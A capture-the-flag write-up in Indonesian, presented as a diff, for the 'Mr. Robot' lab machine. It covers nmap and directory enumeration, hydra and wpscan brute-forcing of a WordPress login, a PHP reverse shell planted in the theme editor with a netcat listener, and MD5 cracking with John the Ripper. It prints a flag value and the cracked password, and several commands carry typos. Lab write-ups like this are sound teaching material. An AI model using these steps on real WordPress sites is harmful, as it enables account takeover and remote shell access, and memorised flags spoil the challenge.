@@ -1,0 +1,77 @@
+## Tugas
+Bisakah Anda me-root mesin bergaya Mr. Robot ini? Ini adalah mesin virtual yang ditujukan untuk pengguna pemula/menengah. Ada 3 kunci tersembunyi yang terletak di mesin, dapatkah Anda menemukannya?
+
+# enumeration
+# Kami Mulai dengan pemindaian nmap pada target
+$ nmap -Pn 10.10.9.219
+
+# dan mendaptkan bahwa port 80 terbuka
+# dan kita buka browser untuk melihat nya
+
+# sekarang kita akan menggunakan tools dirsearch atau go busteruntuk mendapatkan directori dari target kita
+$ dirsearch -u https://10.10.9.219/ 50 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 127 x
+$ gobuster dir -u -https://10.10.9.219/ -w /usr/share/wordlists/dirb/common.txt -o directories.txt
+# kita mendapatkan banyak directori dan Saat Mengunjungi direktori /robots kami menemukan fsicoty.dic dan key-1-of-3.txt
+# dan kita lihat di browser https://10.10.9.219/key-1-og-3.txt kita menemukan kunci pertama
+073403c8a58a1f80d943455fb30724b9 
+
+# kemudina kita akses https://10.10.9.219/wp-admin
+#
+# kitaakan melakukan brute force dengan hydra dan list apassword dari file fsicoty.dic
+# kita unduh dulu file nya gendan perintah wget
+$ wget http://10.10.9.219/fsocity.dic
+# pertama-tama kita akan mencoba mencari nama pengguna dengan kata sandi sebagai konstan, kemudian kita akan menggunakan nama pengguna yang ditemukan untuk mendapatkan kata sandi
+$ hydra -L fsocity.dic -p test 10.10.9.219 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+# Kami mendapatkan nama pengguna sebagai Elliot.
+
+Mari kita coba login dengan Elliot:test
+# Kami mendapatkan kesalahan: Kata sandi yang Anda masukkan untuk nama pengguna Elliot salah.
+# kita lanjutkan untuk mendaptkan passwordnya
+# untuk wordlistnya bisa juga pakai rockyou
+$ hydra -l Elliot -P fsocity.dic 10.10.9.219 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
+# dan Kami mendapatkan kata sandi 9 digit : ER28–0652
+# sekarang kita login ke wordpress nya
+
+
+# atau menggunakan wpscan untuk mendapatkanpasswordnya
+$ wpscan -u https://10.10.9.219/wp-login.php -U Elliot -P fsicoty.dic
+
+
+# Situs ini menjalankan WordPress 4.3.1.
+#
+# Sekarang kita perlu membuka shell terbalik, jadi mari kita coba membuka file php-reverse-shell. Kali dan ParrotOS sudah memilikinya.
+# untuk mencari nya ketik
+$ locate php-reverse-shell
+
+
+### Opening a reverse-shell
+# Di wp-admin, pergi ke bilah navigasi kiri dan pilih Appearance → Editorlalu pilih Archives (archive.php)di sebelah kanan
+
+# Tempel php-reverse-shell.php di bagian Edit
+# Sekarang kita harus mengedit nilai variabel IP. Kita harus mengaturnya ke IP kita, sehingga ketika shell terbalik dibuka, ia tahu IP mana yang harus dihubungkan.
+
+#Sekarang mari kita buka archive.php. Periksa tema apa yang sedang berjalan dan buka tema seperti yang ditunjukkan di bawah ini.
+https://10.10.9.219/wp-content/themes/twentyfifteen/archive.php
+
+# kemudian kita jalnakan netcat
+$ nv -nlvp 1234
+
+# sekarang kita sudah terhubung ke arget
+# Kita perlu pengguna robot untuk membaca key-2-of-3.txt tapi kita masih bisa membaca password.raw-md5. Jadi mari kita lakukan itu.
+#
+cat key-2-of-3.txt 
+
+# Mari kita gunakan John-The-Ripper , untuk memecahkan hash MD5 ini
+$ john robot.hash --wordlists=fsocity.dic --format=Raw.MD5 
+
+
+# Beralih ke robot pengguna
+# Untuk berpindah pengguna, kita memerlukan terminal dan kita tidak dapat membuka terminal menggunakan /bin/sh -i
+#
+su robot
+/bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+
+
+
